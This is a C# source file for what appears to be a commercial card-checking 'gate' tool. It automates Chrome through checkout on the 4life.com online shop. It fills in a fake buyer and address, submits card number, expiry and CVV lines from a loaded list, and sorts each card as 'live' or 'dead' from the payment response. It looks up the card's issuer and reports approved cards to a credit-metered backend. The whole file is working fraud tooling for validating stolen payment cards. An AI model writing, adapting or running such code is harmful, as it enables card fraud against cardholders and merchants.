using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class _4life
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }


        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        private bool tiempoElementoeMAILTR(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }
        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
            {

                Thunder._Form1.update_progresbar(5);
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");//"--headless"

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.4life.com/corp/shop/all/(1-14)?sort=1";
                Thread.Sleep(1000);

                Thunder._Form1.update_progresbar(7);
                //*[@id="main-content-wrapper"]/div[5]/div[1]/a
                //*[@id="main-content-wrapper"]/div[5]/div[3]/a
                //*[@id="main-content-wrapper"]/div[5]/div[16]/a
                var producto = "//*[@id='main-content-wrapper']/div[5]/div["+RandomNumber(1,16)+"]/a";
                try
                {
                    if (tiempoElemento(By.XPath(producto)))
                    {
                        Thunder._Form1.update_progresbar(20);

                        driver.FindElementByXPath(producto).Click();
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("//*[@id='product-detail-add']/div[2]/button")))
                        {
                            driver.FindElementByXPath("//*[@id='product-detail-add']/div[2]/button").Click();
                            Thread.Sleep(3000);

                            driver.FindElement(By.XPath("//*[@id='btn-mobile-cart']")).Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.XPath("//*[@id='btnCartCheckout']")))
                            {
                                driver.FindElementByXPath("//*[@id='btnCartCheckout']").Click();
                                Thread.Sleep(1000);

                                if (tiempoElemento(By.XPath("//*[@id='Name']")))
                                {
                                    driver.FindElementByXPath("//*[@id='Name']").SendKeys("JOSE REYES");
                                    Thread.Sleep(500);
                                    driver.FindElementByXPath("//*[@id='Phone']").SendKeys("21385412569");
                                    Thread.Sleep(500);
                                    driver.FindElementByXPath("//*[@id='Email']").SendKeys(correo);
                                    Thread.Sleep(500);
                                    driver.FindElementByXPath("//*[@id='ShipAddressLine1']").SendKeys("4208 GRAINARY AVE");
                                    Thread.Sleep(500);
                                    driver.FindElementByXPath("//*[@id='ShipCity']").SendKeys("MIAMI");
                                    Thread.Sleep(500);
                                    driver.FindElementByXPath("//*[@id='ShipPostalCode']").SendKeys("33624");
                                    Thread.Sleep(500);
                                    var estado = new SelectElement(driver.FindElementByXPath("//*[@id='ShipState']"));
                                    estado.SelectByValue("FL");
                                    Thread.Sleep(500);

                                    driver.FindElementByXPath("//*[@id='judo-submit-desktop']").Click();
                                    Thread.Sleep(1000);

                                    if (tiempoElemento(By.XPath("/html/body/div[2]/div/div/form/div/button")))
                                    {
                                        driver.FindElementByXPath("/html/body/div[2]/div/div/form/div/button").Click();
                                        Thread.Sleep(1000);

                                        if (tiempoElemento(By.XPath("//*[@id='RecommendedAddressBtn']")))
                                        {
                                            driver.FindElementByXPath("//*[@id='RecommendedAddressBtn']").Click();
                                            Thread.Sleep(1000);

                                            if (tiempoElemento(By.XPath("//*[@id='CardName']")))
                                            {
                                                pago();
                                            }
                                            else
                                            {
                                                restart();
                                            }
                                        }
                                        else
                                        {
                                            restart();
                                        }
                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                       
                     


                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
                    {
                        restart();
                    }

                }

            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {

            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
            {
                try
                {
                    pagos = 0;

                    driver.Close();
                    driver.Quit();
                    load();
                }
                catch (Exception)
                {


                    pagos = 0;
                    driver.Quit();
                    load();
                }
            }


        }

        private void GetEmail()
        {
            try
            {
                //###--obtener email--#####
                ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
                driver.SwitchTo().Window(driver.WindowHandles.Last());
                Thread.Sleep(300);
                driver.Url = "https://www.abandonmail.com/es";
                Thread.Sleep(5000);

                if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
                {
                    driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
                {
                    correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                Thread.Sleep(1000);

                driver.SwitchTo().Window(driver.WindowHandles.First());
            }
            catch (Exception ex)
            {


                if (Variables.run == true)
                {
                    restart();
                }
            }






        }
        private void pago()
        {
            try
            {



                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
                {
                    if (pagos < 10)
                    {
                        Thunder._Form1.update_progresbar(90);

                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        if (tiempoElemento(By.XPath("//*[@id='CardName']")))
                        {

                            if (pagos == 0)
                            {
                                driver.FindElementByXPath("//*[@id='CardName']").SendKeys("JOSE REYES");
                                Thread.Sleep(500);
                                driver.FindElementByXPath("//*[@id='ZipCode']").SendKeys("33624");
                                Thread.Sleep(500);
                            }
                            

                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='CardNumber']").Clear();
                            Thread.Sleep(1000);
                            var tipoCc = new SelectElement(driver.FindElementByXPath("//*[@id='CardType']"));
                            if (ccnum[0].ToString().Trim() == "4")
                            {
                                tipoCc.SelectByValue("Visa");
                            }
                            if (ccnum[0].ToString().Trim() == "5")
                            {
                                tipoCc.SelectByValue("Master Card");
                            }
                            if (ccnum[0].ToString().Trim() == "6")
                            {
                                tipoCc.SelectByValue("Discover");
                            }
                            if (ccnum[0].ToString().Trim() == "3")
                            {
                                tipoCc.SelectByValue("American Express");
                            }


                           
                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='CardNumber']").SendKeys(ccnum);
                            Thread.Sleep(1000);
                            var mes  = new SelectElement( driver.FindElementByXPath("//*[@id='ExpirationMonth']"));
                            mes.SelectByText(Int16.Parse(ccLine[1]).ToString());
                            Thread.Sleep(1000);
                            var anio = new SelectElement(driver.FindElementByXPath("//*[@id='ExpirationYear']"));
                            anio.SelectByText(Int16.Parse(ccLine[2]).ToString());
                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='CVV']").Clear();
                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='CVV']").SendKeys(ccLine[3]);
                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='creditCardForm']/div[10]/button[3]").Click();
                            Thread.Sleep(5000);

                        }
                        else
                        {
                            restart();
                        }


                        Thunder._Form1.update_progresbar(95);

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = "";
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "3")
                {
                    restart();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                Thunder._Form1.abort();
                return;
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
                Thunder._Form1.abort();
                return;
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {



                    if (IsElementPresent(By.XPath("/html/body/div[2]/div[1]/ul/li")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[2]/div[1]/ul/li")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[2]/div[1]/ul/li")).Text.Contains("CVV2/CVC2 Failure"))
                            {
                                Thunder._Form1.agrgar_live_cvv("(no cvc) - ");
                                estado = "live";
                            }
                            else
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='pageTitle']")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='pageTitle']")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='pageTitle']")).Text.Trim() == "Confirmation")
                            {

                                estado = "live";
                            }
                        }
                    }

                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            

            if (estado == "dead")
            {

                return false;




            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

